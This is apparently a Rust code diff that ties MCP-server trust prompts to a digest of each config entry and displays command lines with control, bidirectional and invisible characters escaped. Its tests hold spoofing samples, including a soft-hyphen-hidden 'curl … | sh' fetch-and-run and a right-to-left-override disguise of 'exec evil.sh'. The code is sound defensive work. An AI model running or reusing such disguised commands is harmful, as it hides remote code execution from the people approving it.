@@ -250,8 +250,9 @@ pub enum Event {
     /// Rows written into the transcript as they are, with no glyph: the
     /// project trust prompt (`presentProjectMcpPrompt`, `main.zig:1818-1832`).
     Raw(String),
-    /// The trust prompt is up for this server.
-    TrustPrompt { name: String },
+    /// The trust prompt is up for this server, showing the entry whose
+    /// [`config::entry_digest`] this is: what `1` approves.
+    TrustPrompt { name: String, digest: String },
     /// The menu's feedback row.
     MenuFeedback(String),
     /// What a menu catalog read found, for the read that asked.
@@ -440,11 +441,15 @@ struct State {
     /// A reload asked for while one was running, and where it is told.
     again: Option<Origin>,
     prompts_suppressed: bool,
-    /// The server the trust prompt is up for.
-    prompting: Option<String>,
+    /// The server the trust prompt is up for, and the digest of the entry it
+    /// showed.
+    prompting: Option<(String, String)>,
     /// The configuration the last reload read, for one that only changes
     /// trust choices to compare against.
     choices: Choices,
+    /// Each `.mcp.json` entry the last read found, with its digest: what an
+    /// approval by name is for ([`config::apply_action`]).
+    digests: Vec<(String, String)>,
 }
 
 /// How a workspace server's `${VAR}` is looked up.
@@ -511,6 +516,7 @@ impl McpRuntime {
                 prompts_suppressed: false,
                 prompting: None,
                 choices: Choices::default(),
+                digests: Vec::new(),
             }),
             names: Mutex::new(ToolNames::new(crate::tools::ADVERTISED_TOOLS)),
             events: Mutex::new(VecDeque::new()),
@@ -698,11 +704,12 @@ impl McpRuntime {
         if self.paths.profile.is_none() && self.paths.settings.is_none() {
             return;
         }
-        if let Ok((configs, issues, choices)) = self.read_configuration() {
+        if let Ok((configs, issues, choices, digests)) = self.read_configuration() {
             let mut state = self.state();
             state.servers = configs.into_iter().map(Server::new).collect();
             state.issues = issues;
             state.choices = choices;
+            state.digests = digests;
             drop(state);
             self.present_prompt();
         }
@@ -712,8 +719,20 @@ impl McpRuntime {
             .spawn(move || runtime.reload(Origin::Startup));
     }
 
-    /// What both files say now.
-    fn read_configuration(&self) -> Result<(Vec<ServerConfig>, Vec<String>, Choices), McpError> {
+    /// What both files say now: the servers, the workspace file's issues, the
+    /// person's choices, and each workspace entry's digest.
+    #[allow(clippy::type_complexity)]
+    fn read_configuration(
+        &self,
+    ) -> Result<
+        (
+            Vec<ServerConfig>,
+            Vec<String>,
+            Choices,
+            Vec<(String, String)>,
+        ),
+        McpError,
+    > {
         let mut servers = match &self.paths.profile {
             Some(path) => {
                 config::load_profile(path)
@@ -734,7 +753,7 @@ impl McpRuntime {
                 servers.push(server);
             }
         }
-        Ok((servers, workspace.issues, choices))
+        Ok((servers, workspace.issues, choices, workspace.digests))
     }
 
     /// Reads both files again and connects what changed, telling `origin`
@@ -769,7 +788,7 @@ impl McpRuntime {
     }
 
     fn reload_once(self: &Arc<Self>, origin: Origin) {
-        let (configs, issues, choices) = match self.read_configuration() {
+        let (configs, issues, choices, digests) = match self.read_configuration() {
             Ok(read) => read,
             Err(err) => {
                 let body = match origin {
@@ -812,6 +831,7 @@ impl McpRuntime {
             state.servers = next.clone();
             state.issues = issues.clone();
             state.choices = choices.clone();
+            state.digests = digests.clone();
             drop(state);
             self.present_prompt();
             self.say(Event::Changed);
@@ -834,6 +854,7 @@ impl McpRuntime {
             let old = std::mem::replace(&mut state.servers, next.clone());
             state.issues = issues;
             state.choices = choices;
+            state.digests = digests;
             old.into_iter()
                 .filter(|server| !next.iter().any(|kept| Arc::ptr_eq(kept, server)))
                 .collect()
@@ -1133,39 +1154,50 @@ impl McpRuntime {
     // trust
     // -----------------------------------------------------------------------
 
-    /// The workspace server the trust prompt should ask about next: the
-    /// first one still pending, unless the person dismissed the prompts.
-    pub fn pending_prompt(&self) -> Option<String> {
+    /// The workspace server the trust prompt should ask about next -- the
+    /// first one still pending, unless the person dismissed the prompts --
+    /// with the digest of its entry as read.
+    fn pending_prompt(&self) -> Option<(ServerConfig, String)> {
         let state = self.state();
         if state.prompts_suppressed {
             return None;
         }
-        state
+        let server = state
             .servers
             .iter()
-            .find(|server| server.config.admission == Some(Admission::Pending))
-            .map(|server| server.config.name.clone())
+            .find(|server| server.config.admission == Some(Admission::Pending))?;
+        let digest = state
+            .digests
+            .iter()
+            .find(|(name, _)| *name == server.config.name)?
+            .1
+            .clone();
+        Some((server.config.clone(), digest))
     }
 
     /// Puts the trust prompt up for the next pending server, when one is
-    /// pending and none is up.
+    /// pending and none is up for that entry. Upstream's two rows, with what
+    /// the entry runs or reaches between them ([`what_it_runs`]): the name is
+    /// the repository's to choose, so it says nothing about what would run.
     fn present_prompt(&self) {
-        let Some(name) = self.pending_prompt() else {
+        let Some((config, digest)) = self.pending_prompt() else {
             self.state().prompting = None;
             return;
         };
+        let name = config.name.clone();
         {
             let mut state = self.state();
-            if state.prompting.as_deref() == Some(name.as_str()) {
+            if state.prompting.as_ref() == Some(&(name.clone(), digest.clone())) {
                 return;
             }
-            state.prompting = Some(name.clone());
+            state.prompting = Some((name.clone(), digest.clone()));
         }
         self.say(Event::Raw(format!(
-            "Project MCP server '{}' is defined in .mcp.json.\n  [1] approve  [2] approve all  [3] reject  [esc] dismiss remaining prompts\n",
-            super::terminal_safe(&name)
+            "Project MCP server '{}' is defined in .mcp.json.\n  {}\n  [1] approve  [2] approve all  [3] reject  [esc] dismiss remaining prompts\n",
+            prompt_value(&super::terminal_safe(&name)),
+            what_it_runs(&config)
         )));
-        self.say(Event::TrustPrompt { name });
+        self.say(Event::TrustPrompt { name, digest });
     }
 
     /// The prompt has been answered or overtaken: the next reload may put
@@ -1193,7 +1225,8 @@ impl McpRuntime {
             self.present_prompt();
             return;
         };
-        match config::save_action(&settings, &self.paths.workspace, &action) {
+        let loaded = self.state().digests.clone();
+        match config::save_action(&settings, &self.paths.workspace, &action, &loaded) {
             Ok(_) => {
                 self.notice(false, body);
                 self.reload(Origin::Transcript);
@@ -1576,5 +1609,204 @@ impl McpRuntime {
 impl Drop for McpRuntime {
     fn drop(&mut self) {
         self.shutdown();
+    }
+}
+
+/// The trust prompt's rows that say what approving lets run or reach, as the
+/// entry has it (`${VAR}` and all: a pending entry is not expanded), each
+/// spelled by [`prompt_value`] and never cut short: a stdio server's command
+/// line and the names of the variables it sets, or a remote server's address
+/// and the headers it sends with where each value comes from. Names, never values: a value can
+/// be a credential written into the file, and these rows stay in the
+/// transcript. A changed environment or credential source is a changed entry
+/// ([`config::entry_digest`]), and these rows are how its prompt differs from
+/// the one already answered.
+fn what_it_runs(config: &ServerConfig) -> String {
+    let mut rows = match config.transport {
+        Kind::Stdio => {
+            let words: Vec<String> = std::iter::once(&config.command)
+                .chain(&config.args)
+                .map(|word| shell_word(word))
+                .collect();
+            vec![format!("command: {}", words.join(" "))]
+        }
+        Kind::Http | Kind::Sse => vec![format!("url: {}", config.url)],
+    };
+    let names: Vec<String> = config.env.iter().map(|(name, _)| name.clone()).collect();
+    if !names.is_empty() {
+        rows.push(format!("env: {}", names.join(", ")));
+    }
+    let headers: Vec<String> = config
+        .headers
+        .iter()
+        .map(|(name, _)| name.clone())
+        .chain(
+            config
+                .header_env
+                .iter()
+                .map(|(name, variable)| format!("{name} from ${variable}")),
+        )
+        .chain(
+            config
+                .bearer_token_env
+                .iter()
+                .map(|variable| format!("Authorization from ${variable}")),
+        )
+        .collect();
+    if !headers.is_empty() {
+        rows.push(format!("headers: {}", headers.join(", ")));
+    }
+    rows.iter()
+        .map(|row| prompt_value(row))
+        .collect::<Vec<_>>()
+        .join("\n  ")
+}
+
+/// One value of the trust prompt as the approval view spells a command it
+/// asks about ([`crate::tui::approval_view::command_text`]): nothing a
+/// terminal would obey, and nothing it would hide or reorder -- a
+/// bidirectional override, a zero-width or invisible code point -- left as it
+/// is, so the prompt cannot show a command other than the one that runs. One
+/// row: a line break is `\x0a` here, where the approval view keeps it as a
+/// row break, so a value cannot draw rows of its own under the prompt's.
+#[cfg(unix)]
+fn prompt_value(text: &str) -> String {
+    crate::tui::approval_view::command_text(&text.replace('\n', "\\x0a"))
+}
+
+/// Where there is no TUI to borrow the approval view from, upstream's tokens
+/// alone ([`crate::tools::question::terminal_safe`]), which spell the line
+/// break too.
+#[cfg(not(unix))]
+fn prompt_value(text: &str) -> String {
+    crate::tools::question::terminal_safe(text).into_owned()
+}
+
+/// One word of a command line as a POSIX shell would read it back: bare when
+/// nothing in it needs quoting, else single-quoted, else -- when it holds a
+/// control character -- ANSI-C quoted with the character spelled out, so the
+/// shown word means what the shell would be given.
+fn shell_word(word: &str) -> String {
+    let bare = |byte: u8| byte.is_ascii_alphanumeric() || b"/._-+=:,@%".contains(&byte);
+    if !word.is_empty() && word.bytes().all(bare) {
+        return word.to_string();
+    }
+    if !word.chars().any(char::is_control) {
+        return format!("'{}'", word.replace('\'', r"'\''"));
+    }
+    let mut out = String::from("$'");
+    for character in word.chars() {
+        match character {
+            '\\' => out.push_str(r"\\"),
+            '\'' => out.push_str(r"\'"),
+            '\n' => out.push_str(r"\n"),
+            '\t' => out.push_str(r"\t"),
+            '\r' => out.push_str(r"\r"),
+            other if other.is_control() => out.push_str(&format!("\\u{:04X}", u32::from(other))),
+            other => out.push(other),
+        }
+    }
+    out.push('\'');
+    out
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn the_prompt_shows_each_word_as_a_shell_would_read_it_back() {
+        let mut config = ServerConfig::local(
+            "p",
+            "/usr/bin/env",
+            &[
+                "node".into(),
+                "it's here".into(),
+                String::new(),
+                "line\nbreak\u{1b}[2J".into(),
+            ],
+        );
+        assert_eq!(
+            what_it_runs(&config),
+            r"command: /usr/bin/env node 'it'\''s here' '' $'line\nbreak\u001B[2J'"
+        );
+        // The variables it sets are named; their values are not shown.
+        config.env = vec![
+            ("NODE_OPTIONS".into(), "--require ./x.js".into()),
+            ("API_KEY".into(), "literal-secret".into()),
+        ];
+        assert_eq!(
+            what_it_runs(&config),
+            "command: /usr/bin/env node 'it'\\''s here' '' $'line\\nbreak\\u001B[2J'\n  env: NODE_OPTIONS, API_KEY"
+        );
+        config.env.clear();
+        config.transport = Kind::Http;
+        config.url = "https://example.test/mcp?x=\u{7}1\n  [1] approve".into();
+        // A control character is spelled out, not dropped, and a line break
+        // draws no row of its own.
+        assert_eq!(
+            what_it_runs(&config),
+            r"url: https://example.test/mcp?x=\x071\x0a  [1] approve"
+        );
+        config.url = "https://example.test/mcp".into();
+        config.headers = vec![("X-A".into(), "static-secret".into())];
+        config.header_env = vec![("X-Team".into(), "TEAM".into())];
+        config.bearer_token_env = Some("TOKEN".into());
+        assert_eq!(
+            what_it_runs(&config),
+            "url: https://example.test/mcp\n  headers: X-A, X-Team from $TEAM, Authorization from $TOKEN"
+        );
+    }
+
+    #[test]
+    fn a_character_that_reorders_or_hides_text_is_named_in_every_prompt_row() {
+        // U+202E (right-to-left override) would draw `exec evil.sh ; safe`
+        // backwards; U+2066 (left-to-right isolate) and U+200B (zero width
+        // space) change what is drawn without being seen. The approval view's
+        // spelling names each by its number.
+        let mut config = ServerConfig::local(
+            "p",
+            "/bin/sh",
+            &[
+                "-c".into(),
+                "safe \u{202e}hs.live cexe".into(),
+                "\u{2066}x\u{200b}".into(),
+            ],
+        );
+        config.env = vec![("K".into(), "v".into())];
+        let shown = what_it_runs(&config);
+        assert_eq!(
+            shown,
+            r"command: /bin/sh -c 'safe \u{202e}hs.live cexe' '\u{2066}x\u{200b}'
+  env: K"
+        );
+        assert!(
+            !shown.contains(['\u{202e}', '\u{2066}', '\u{200b}']),
+            "{shown:?}"
+        );
+        config.transport = Kind::Http;
+        config.url = "https://a.test/\u{202e}lmth.xedni".into();
+        assert_eq!(
+            what_it_runs(&config),
+            r"url: https://a.test/\u{202e}lmth.xedni
+  env: K"
+        );
+    }
+
+    #[test]
+    fn a_soft_hyphen_run_cannot_hide_the_tail_of_a_command() {
+        // SEC-A4 measured that a run of U+00AD hides what follows in tmux and
+        // herdr: the prompt would show `/bin/true` while `; curl …` runs.
+        let config = ServerConfig::local(
+            "p",
+            "/bin/sh",
+            &[
+                "-c".into(),
+                "/bin/true\u{ad}\u{ad}\u{ad}; curl -s x.test | sh".into(),
+            ],
+        );
+        let shown = what_it_runs(&config);
+        assert!(!shown.contains('\u{ad}'), "{shown:?}");
+        assert!(shown.contains(r"\u{00ad}"), "{shown:?}");
     }
 }
